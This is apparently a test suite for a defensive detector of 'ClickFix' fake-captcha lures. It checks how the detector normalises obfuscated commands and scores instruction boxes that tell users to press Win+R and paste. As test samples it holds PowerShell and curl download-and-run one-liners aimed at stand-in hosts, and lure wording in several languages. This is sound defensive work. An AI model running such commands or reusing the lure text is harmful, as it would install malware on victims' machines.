import { describe, expect, it } from 'vitest';
import { normalize } from '../../src/engine/normalize';
import { scorePageText, classifyTriggerText } from '../../src/engine/page';
import { BUNDLED_RULES } from '../../src/engine/rules';
import { evaluateCommand, extractTargets } from '../../src/engine/score';
import { BENIGN, LURES } from './samples';

const rules = BUNDLED_RULES;

describe('normalize', () => {
  it('removes cmd caret escapes', () => {
    expect(normalize('p^o^w^e^r^s^h^e^l^l -c x').match).toContain('powershell');
  });
  it('joins quoted string pieces', () => {
    expect(normalize(`'Dow'+'nloadString'`).match).toContain('downloadstring');
  });
  it('removes powershell backticks', () => {
    expect(normalize('p`ow`er`shell').match).toContain('powershell');
  });
  it('decodes utf-16 base64 payloads', () => {
    const enc = Buffer.from('iex (iwr http://192.0.2.10/a.ps1)', 'utf16le').toString('base64');
    const n = normalize(`powershell -enc ${enc}`);
    expect(n.base64).toBe(true);
    expect(n.decoded[0]).toContain('iwr http://192.0.2.10/a.ps1');
  });
  it('measures blank padding and shows it as a gap', () => {
    const n = normalize(`cmd /c calc${' '.repeat(40)}# note`);
    expect(n.maxSpaceRun).toBe(40);
    expect(n.display.some((p) => p.t === 'gap' && p.n === 40)).toBe(true);
  });
  it('flags invisible characters', () => {
    expect(normalize('power​shell').invisible).toBe(true);
  });
  it('flags and folds look-alike letters', () => {
    const n = normalize('powеrshell -c x');
    expect(n.homoglyph).toBe(true);
    expect(n.match).toContain('powershell');
  });
  it('decodes [char] sequences', () => {
    expect(normalize('[char]105+[char]101+[char]120').match).toContain('iex');
  });
});

describe('command scoring', () => {
  for (const [name, text] of Object.entries(LURES)) {
    it(`blocks lure: ${name}`, () => {
      const v = evaluateCommand(text, rules);
      expect(v.level, JSON.stringify({ score: v.score, reasons: v.reasons.map((r) => r.id) })).toBe('block');
    });
  }
  for (const [name, text] of Object.entries(BENIGN)) {
    it(`allows benign: ${name}`, () => {
      const v = evaluateCommand(text, rules, { trigger: 'copy' });
      expect(v.level, JSON.stringify({ score: v.score, reasons: v.reasons.map((r) => r.id) })).not.toBe('block');
    });
    it(`allows benign without a copy button: ${name}`, () => {
      const v = evaluateCommand(text, rules, { manual: true });
      expect(v.level).not.toBe('block');
    });
  }

  it('blocks a plain download-and-run when the page tells you to paste it', () => {
    const plain = 'irm https://x.example.invalid/a | iex';
    expect(evaluateCommand(plain, rules).level).not.toBe('block');
    expect(evaluateCommand(plain, rules, { pageScore: 50 }).level).toBe('block');
    expect(evaluateCommand(plain, rules, { trigger: 'captcha' }).level).toBe('block');
    expect(evaluateCommand(plain, rules, { pageReported: true }).level).toBe('block');
  });

  it('finds download addresses written without a scheme', () => {
    expect(extractTargets('IRM x.example.invalid/Katy7684/raw/main/95c9 | IEX')).toContain('https://x.example.invalid/Katy7684/raw/main/95c9');
    expect(extractTargets('curl -fsSL get.example.invalid/install.sh | sh')).toContain('https://get.example.invalid/install.sh');
    expect(extractTargets('irm https://x.example.invalid/a | iex')).toEqual(['https://x.example.invalid/a']);
    expect(extractTargets('curl.exe -s evil.example.invalid/x | cmd')).toContain('https://evil.example.invalid/x');
    expect(extractTargets('irm evil.example.invalid | iex')).toContain('https://evil.example.invalid/');
    expect(extractTargets("irm -UserAgent 'Mozilla/5.0' -Headers @{'X-A'='b'} evil.example.invalid/p | iex")).toEqual(['https://evil.example.invalid/p']);
    expect(extractTargets('iwr -Uri evil.example.invalid/p -OutFile a.exe')).toEqual(['https://evil.example.invalid/p']);
    expect(extractTargets('curl -fsSL get.example.invalid/x -o install.sh && iwr a.example.invalid/c -OutFile update.zip')).toEqual(['https://get.example.invalid/x', 'https://a.example.invalid/c']);
    expect(extractTargets('curl -s setup.py | sh')).toEqual([]);
    expect(extractTargets('iwr evil.example.invalid/a -OutFile setup.msix')).toEqual(['https://evil.example.invalid/a']);
  });

  it('never blocks text without anything that runs', () => {
    const v = evaluateCommand('# I am not a robot - reCAPTCHA Verification ID: 4821', rules, { pageScore: 50, trigger: 'captcha' });
    expect(v.gate).toBe(false);
    expect(v.level).toBe('none');
  });

  it('extracts payload addresses including decoded ones', () => {
    const enc = Buffer.from('iwr http://192.0.2.10/a.ps1', 'utf16le').toString('base64');
    const urls = extractTargets(`powershell -enc ${enc} ; mshta hxxps://evil.example.invalid/x.hta`, normalize(`powershell -enc ${enc}`).decoded);
    expect(urls).toContain('https://evil.example.invalid/x.hta');
    expect(urls).toContain('http://192.0.2.10/a.ps1');
  });
});

describe('page instructions', () => {
  const lure = 'Verify you are human. 1. Press Windows Key + R 2. Press CTRL + V 3. Press Enter';
  it('scores a fake captcha instruction box', () => {
    const v = scorePageText(lure, rules);
    expect(v.score).toBe(50);
    expect(v.standalone).toBe(true);
  });
  it('understands instructions in other languages', () => {
    expect(scorePageText('No soy un robot. Presione Win + R, luego Ctrl + V y presione Enter', rules).standalone).toBe(true);
    expect(scorePageText('Я не робот. Нажмите Win + R, затем Ctrl + V и нажмите Enter', rules).standalone).toBe(true);
    expect(scorePageText('Ich bin kein Roboter. Drücken Sie Win + R, dann Strg + V und drücken Sie Enter', rules).standalone).toBe(true);
  });
  it('scores the Win+X terminal variant', () => {
    const v = scorePageText('Press Win + X, choose Terminal (Admin), press Ctrl + V. I am not a robot', rules);
    expect(v.ids.has('page-win-x')).toBe(true);
    expect(v.standalone).toBe(true);
  });
  it('scores a Win+X box that asks to verify your request', () => {
    const v = scorePageText('To verify your request Perform the following steps: Verification code copied. Awaiting terminal input... Press Win + X, choose Terminal or press I, press Ctrl + V to paste, press Enter', rules);
    expect(v.ids.has('page-verify-human')).toBe(true);
    expect(v.standalone).toBe(true);
  });
  it('scores a box that asks to prove you are not a robot', () => {
    const v = scorePageText('Performing security verification. To better prove you are not a robot, please: 1. Press Windows Key + X combination to open Power User menu. 2. Press I to open Windows PowerShell or Terminal. 3. In the verification window, press Ctrl + V. 4. Press Enter on your keyboard to finish.', rules);
    expect(v.standalone).toBe(true);
  });
  it('scores the macOS terminal variant', () => {
    const v = scorePageText('Press Cmd + Space, type Terminal, then press Cmd + V and Enter. Verify you are human', rules);
    expect(v.ids.has('page-mac-terminal')).toBe(true);
    expect(v.standalone).toBe(true);
  });
  it('scores the FileFix variant', () => {
    const v = scorePageText('Open File Explorer, click the address bar, press Ctrl + V. Verify you are human', rules);
    expect(v.ids.has('page-filefix')).toBe(true);
  });
  it('does not raise a banner for a normal support article', () => {
    const v = scorePageText('To open System Configuration, press Windows logo key + R, type msconfig and select OK.', rules);
    expect(v.standalone).toBe(false);
  });
  it('does not raise a banner on a long article about ClickFix', () => {
    const v = scorePageText(`${'Security news. '.repeat(500)} ${lure}`, rules);
    expect(v.standalone).toBe(false);
  });
});

describe('trigger classification', () => {
  it('treats a robot checkbox as a captcha trigger', () => {
    expect(classifyTriggerText("I'm not a robot", false, rules)).toBe('captcha');
    expect(classifyTriggerText('', true, rules)).toBe('captcha');
  });
  it('treats copy buttons as copy', () => {
    expect(classifyTriggerText('Copy', false, rules)).toBe('copy');
    expect(classifyTriggerText('Kopieren', false, rules)).toBe('copy');
  });
  it('treats fix buttons as fix', () => {
    expect(classifyTriggerText('Fix it', false, rules)).toBe('fix');
  });
});
